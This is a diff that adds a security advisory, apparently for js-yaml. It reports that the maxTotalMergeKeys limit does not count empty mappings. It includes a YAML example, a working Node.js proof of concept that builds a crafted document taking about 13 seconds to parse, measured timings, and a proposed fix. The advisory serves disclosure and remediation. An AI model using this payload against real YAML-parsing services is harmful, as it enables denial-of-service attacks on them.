@@ -1,0 +1,36 @@
+Summary
+maxTotalMergeKeys does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.
+
+Example
+arr: &arr [{}, {}, {}, ...] # N empty mappings
+targets:
+  - <<: *arr                # repeated K times
+For every target, the loader iterates all N elements of arr. This results in O(N * K) work while totalMergeKeys remains unchanged.
+
+PoC
+import { performance } from 'node:perf_hooks'
+import { load, YAML11_SCHEMA } from 'js-yaml'
+
+const n = 20000
+
+const src =
+  'arr: &arr [' + '{},'.repeat(n).slice(0, -1) + ']\n' +
+  'targets:\n' +
+  '  - <<: *arr\n'.repeat(n)
+
+const started = performance.now()
+
+load(src, { schema: YAML11_SCHEMA })
+
+console.log(`${(performance.now() - started).toFixed(1)} ms`)
+Observed results:
+
+N	YAML size	Time
+800	~13 KB	~20 ms
+3200	~50 KB	~180 ms
+20000	~500 KB	~13 s
+Impact
+When merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default maxTotalMergeKeys limit.
+
+Fix
+Count every merge source mapping as one budget unit in addition to counting its keys.
